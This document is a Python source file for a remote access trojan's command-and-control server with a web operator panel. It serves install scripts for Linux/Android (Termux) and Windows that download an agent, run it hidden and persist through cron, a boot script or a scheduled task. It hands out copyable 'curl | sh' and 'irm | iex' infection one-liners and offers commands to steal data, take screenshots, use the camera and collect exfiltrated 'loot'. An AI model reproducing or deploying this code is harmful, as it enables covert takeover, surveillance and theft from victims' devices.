#!/usr/bin/env python3
import os, json, time, threading, secrets, base64, urllib.request
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

PORT = int(os.environ.get("PORT", 8080))
AUTH = os.environ.get("AUTH") or secrets.token_hex(12)
TOKEN = os.environ.get("AGENT_TOKEN") or secrets.token_hex(12)
BASE = os.environ.get("BASE_URL", "").rstrip("/")

LOCK = threading.RLock()
S = {}
LOOT = {}

def base_of(h):
    if BASE: return BASE
    proto = h.headers.get("X-Forwarded-Proto", "https")
    return "%s://%s" % (proto, h.headers.get("Host", "localhost"))

def sess(sid):
    with LOCK:
        if sid not in S:
            S[sid] = {"info": {}, "last": time.time(), "q": [], "out": [], "seq": 0, "up": {}}
        S[sid]["last"] = time.time()
        return S[sid]

AGENT = open("agent.py").read() if os.path.exists("agent.py") else ""

def agent_src(host):
    return (AGENT.replace("__BASE__", base_of(host))
                 .replace("__TOKEN__", TOKEN)
                 .replace("__NAME__", "k" + secrets.token_hex(3)))

SIMPLE = {"info": "info", "ps": "ps", "shot": "shot", "cam": "cam", "pwd": "pwd",
          "steal": "steal", "grab": "grab", "persist": "persist",
          "unpersist": "unpersist", "sd": "sd", "py": "py",
          "toast": "toast", "vibrate": "vibrate", "audio": "audio"}

def to_agent(line):
    rid = secrets.token_hex(4)
    if not line.startswith("."):
        return {"t": "shell", "id": rid, "a": line}
    b = line[1:].split(None, 1)
    c = b[0].lower() if b else ""
    a = b[1] if len(b) > 1 else ""
    if c == "cd":   return {"t": "cd", "id": rid, "a": a or "~"}
    if c == "ls":   return {"t": "ls", "id": rid, "a": a}
    if c == "get":  return {"t": "get", "id": rid, "a": a}
    if c == "clip": return {"t": "clip", "id": rid, "op": "set" if a else "get", "a": a}
    if c in SIMPLE: return {"t": SIMPLE[c], "id": rid, "a": a}
    return {"t": "shell", "id": rid, "a": line}

BSH = r"""#!/bin/sh
B="__B__"; D="$HOME/.cache/.k"
mkdir -p "$D" 2>/dev/null
command -v python3 >/dev/null || { command -v pkg >/dev/null && pkg install -y python >/dev/null 2>&1; }
command -v python3 >/dev/null || { command -v apt >/dev/null && (apt update -qq; apt install -y python3) >/dev/null 2>&1; }
curl -fsSL "$B/a" -o "$D/k.py" 2>/dev/null || wget -q "$B/a" -O "$D/k.py"
command -v termux-wake-lock >/dev/null && termux-wake-lock
nohup python3 "$D/k.py" >/dev/null 2>&1 &
if [ -d "$HOME/.termux" ]; then
  mkdir -p "$HOME/.termux/boot"
  printf '#!/data/data/com.termux/files/usr/bin/sh\nnohup python3 %s >/dev/null 2>&1 &\n' "$D/k.py" > "$HOME/.termux/boot/svc.sh"
  chmod +x "$HOME/.termux/boot/svc.sh"
fi
(command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -q k.py) || \
  (command -v crontab >/dev/null && (crontab -l 2>/dev/null; echo "@reboot nohup python3 $D/k.py >/dev/null 2>&1 &") | crontab)
echo "[+] done"
"""

PSH = r"""$B="__B__"; $d="$env:TEMP\svc"; New-Item -ItemType Directory -Force $d | Out-Null
if(-not (Get-Command python -EA SilentlyContinue) -and -not (Test-Path "$d\python.exe")){
  iwr "$B/py" -OutFile "$env:TEMP\py.zip"; Expand-Archive "$env:TEMP\py.zip" $d -Force
}
iwr "$B/a" -OutFile "$d\k.py"
$py = if(Test-Path "$d\python.exe"){"$d\python.exe"}else{"python"}
Start-Process -WindowStyle Hidden -FilePath $py -ArgumentList "`"$d\k.py`""
schtasks /create /tn SysSvc /tr "`"$py`" `"$d\k.py`"" /sc onlogon /f | Out-Null
"""

PANEL = r"""<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>C2</title>
<style>
body{background:#0d1117;color:#c9d1d9;font:13px ui-monospace,monospace;margin:0;padding:10px}
#h{display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-bottom:8px}
input,button{background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:5px;font:inherit}
button{cursor:pointer}#s div{padding:3px;border-bottom:1px solid #21262d;cursor:pointer}
#s div:hover{background:#161b22}#t{height:45vh;overflow:auto;background:#010409;padding:6px;white-space:pre-wrap;border:1px solid #21262d}
#c{width:100%;box-sizing:border-box;margin-top:6px}#l div{padding:2px}
.ok{color:#3fb950}.off{color:#8b949e}#lk{font-size:11px;margin-bottom:8px}
code{background:#010409;padding:2px 4px}
</style>
<div id=h><b>C2</b><input id=k placeholder="AUTH key" size=20><button onclick=save()>connect</button>
<button onclick="links()">links</button><button onclick="cmd('.steal')">steal</button>
<button onclick="cmd('.shot')">shot</button><button onclick="cmd('.info')">info</button>
<button onclick="q('#f').click()">put</button><input type=file id=f style=display:none onchange=up()></div>
<div id=lk></div>
<div id=s></div><div id=t></div><input id=c placeholder="commande (. = RAT cmd)" onkeydown="if(event.key=='Enter')run()">
<div id=l></div>
<script>
let K=localStorage.k||'',cur=null,seq=0,t1,t2;
const q=s=>document.querySelector(s);
function save(){K=q('#k').value;localStorage.k=K;poll()}
async function api(p,o){o=o||{};o.headers=Object.assign({'X-Auth':K},o.headers||{});return fetch(p,o)}
function cmd(c){if(!cur)return;api('/api/cmd',{method:'POST',body:JSON.stringify({sid:cur,cmd:c})})}
function run(){const v=q('#c').value;if(!v||!cur)return;q('#c').value='';cmd(v)}
async function up(){const f=q('#f').files[0];if(!f||!cur)return;
 await api('/api/put',{method:'POST',body:f,headers:{'X-Sid':cur,'X-Name':f.name}});
 q('#t').textContent+='[sent] '+f.name+'\n';q('#f').value=''}
function links(){const o=location.origin;
 q('#lk').innerHTML='<div><b>linux</b> <code>curl -fsSL '+o+'/i | sh</code> <button onclick="cp(this)">copy</button></div>'+
 '<div><b>windows</b> <code>powershell -w hidden -c "irm '+o+'/i.ps1 | iex"</code> <button onclick="cp(this)">copy</button></div>'}
function cp(b){navigator.clipboard.writeText(b.previousElementSibling.textContent)}
async function poll(){
 clearInterval(t1);clearInterval(t2);
 t1=setInterval(async()=>{
  if(!K)return;try{const r=await api('/api/sessions');const j=await r.json();
  q('#s').innerHTML=j.map(s=>`<div class="${s.on?'ok':'off'}" onclick="sel('${s.id}')">${s.on?'*':'-'} ${s.id} ${s.user}@${s.host} ${s.ip} ${s.os}</div>`).join('')||'<i>no sessions</i>'}catch(e){}
 },2500);
 t2=setInterval(async()=>{
  if(!K||!cur)return;try{const r=await api('/api/out?sid='+cur+'&after='+seq);const j=await r.json();
  if(j.lines.length){seq=j.seq;q('#t').textContent+=j.lines.join('');q('#t').scrollTop=1e9}}catch(e){}
 },700);
 try{const r=await api('/api/loot');const j=await r.json();
 q('#l').innerHTML='<b>loot</b>'+j.map(f=>`<div><a href="/api/loot/${f.id}?k=${K}" style="color:#58a6ff">${f.name}</a> ${f.size}b</div>`).join('')}catch(e){}
}
function sel(id){cur=id;seq=0;q('#t').textContent='';q('#c').focus()}
q('#k').value=K;if(K)poll();
</script>"""

class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a): pass

    def snd(self, code, body, ctype="text/plain; charset=utf-8", extra=None):
        if isinstance(body, str): body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items(): self.send_header(k, v)
        self.end_headers()
        try: self.wfile.write(body)
        except Exception: pass

    def auth(self):
        if self.headers.get("X-Auth") == AUTH: return True
        if parse_qs(urlparse(self.path).query).get("k", [""])[0] == AUTH: return True
        self.snd(401, "unauthorized"); return False

    def body(self):
        n = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(n) if n else b""

    def do_GET(self):
        u = urlparse(self.path); p = u.path; qs = parse_qs(u.query)

        if p == "/healthz": return self.snd(200, "ok")
        if p == "/": return self.snd(200, PANEL, "text/html; charset=utf-8")
        if p == "/i": return self.snd(200, BSH.replace("__B__", base_of(self)), "text/x-shellscript")
        if p == "/i.ps1": return self.snd(200, PSH.replace("__B__", base_of(self)), "text/plain")
        if p == "/a": return self.snd(200, agent_src(self), "text/x-python")

        if p == "/link":
            if not self.auth(): return
            o = base_of(self)
            return self.snd(200, "linux:  curl -fsSL %s/i | sh\nwindows: powershell -w hidden -c \"irm %s/i.ps1 | iex\"\n" % (o, o))

        if p == "/py":
            try:
                r = urllib.request.Request(
                    "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip",
                    headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(r, timeout=120) as f: d = f.read()
                return self.snd(200, d, "application/zip")
            except Exception as e: return self.snd(502, "py fetch: %s" % e)

        if p.startswith("/p/"):
            sid = p[3:]
            if qs.get("t", [""])[0] not in ("", TOKEN): return self.snd(403, "bad token")
            s = sess(sid)
            end = time.time() + 25
            while time.time() < end:
                with LOCK:
                    if s["q"]:
                        c = s["q"]; s["q"] = []
                        return self.snd(200, json.dumps({"c": c}), "application/json")
                time.sleep(0.15)
            return self.snd(200, '{"c":[]}', "application/json")

        if p.startswith("/api/"):
            if not self.auth(): return
            if p == "/api/sessions":
                now = time.time()
                with LOCK:
                    j = [{"id": k, "on": now - v["last"] < 90, "user": v["info"].get("user"),
                          "host": v["info"].get("host"), "ip": v["info"].get("ip"),
                          "os": (v["info"].get("os") or "")[:40]} for k, v in S.items()]
                return self.snd(200, json.dumps(j), "application/json")
            if p == "/api/out":
                sid = qs.get("sid", [""])[0]; after = int(qs.get("after", ["0"])[0])
                with LOCK:
                    s = S.get(sid, {"out": [], "seq": 0})
                    lines = [t for i, t in s["out"] if i > after]
                return self.snd(200, json.dumps({"lines": lines, "seq": s["seq"]}), "application/json")
            if p == "/api/loot":
                with LOCK:
                    j = [{"id": k, "name": v["name"], "size": v["size"]} for k, v in LOOT.items()]
                return self.snd(200, json.dumps(j), "application/json")
            if p.startswith("/api/loot/"):
                with LOCK: f = LOOT.get(p.split("/")[-1])
                if not f: return self.snd(404, "nope")
                return self.snd(200, f["data"], "application/octet-stream",
                                {"Content-Disposition": 'attachment; filename="%s"' % f["name"]})
            return self.snd(404, "?")
        self.snd(404, "?")

    def do_POST(self):
        u = urlparse(self.path); p = u.path

        if p.startswith("/r/"):
            sid = p[3:]
            if parse_qs(u.query).get("t", [""])[0] not in ("", TOKEN): return self.snd(403, "bad token")
            try: m = json.loads(self.body() or b"{}")
            except Exception: return self.snd(400, "json")
            s = sess(sid); t = m.get("t")

            if t == "hello": s["info"] = m.get("info", {})
            elif t == "out":
                with LOCK:
                    s["seq"] += 1; s["out"].append((s["seq"], m.get("d", "")))
                    if len(s["out"]) > 4000: s["out"] = s["out"][-3000:]
            elif t == "file":
                fid = m["fid"]
                if m.get("i") == 0: s["up"][fid] = {"name": m["name"], "b": []}
                if fid in s["up"]: s["up"][fid]["b"].append(base64.b64decode(m["d"]))
                if m.get("last"):
                    e = s["up"].pop(fid, None)
                    if e:
                        d = b"".join(e["b"])
                        with LOCK:
                            LOOT[fid] = {"name": os.path.basename(e["name"]), "size": len(d), "data": d}
                            s["seq"] += 1
                            s["out"].append((s["seq"], "[loot] %s (%d b)\n" % (e["name"], len(d))))
            return self.snd(200, "ok")

        if p.startswith("/api/"):
            if not self.auth(): return
            if p == "/api/cmd":
                j = json.loads(self.body() or b"{}")
                sid = j.get("sid")
                with LOCK:
                    if sid in S: S[sid]["q"].append(to_agent(j.get("cmd", "")))
                return self.snd(200, "ok")
            if p == "/api/put":
                sid = self.headers.get("X-Sid"); name = self.headers.get("X-Name", "f.bin")
                data = self.body()
                if sid not in S: return self.snd(404, "no sess")
                fid = secrets.token_hex(4); rid = secrets.token_hex(4)
                with LOCK:
                    S[sid]["q"].append({"t": "put_begin", "id": rid, "fid": fid, "name": os.path.basename(name)})
                    for i in range(0, len(data), 512 * 1024):
                        S[sid]["q"].append({"t": "put_chunk", "id": rid, "fid": fid,
                                            "d": base64.b64encode(data[i:i + 512 * 1024]).decode()})
                    S[sid]["q"].append({"t": "put_end", "id": rid, "fid": fid})
                return self.snd(200, "queued")
            return self.snd(404, "?")
        self.snd(404, "?")

if __name__ == "__main__":
    print("AUTH=%s\nTOKEN=%s\nlistening :%d" % (AUTH, TOKEN, PORT))
    ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
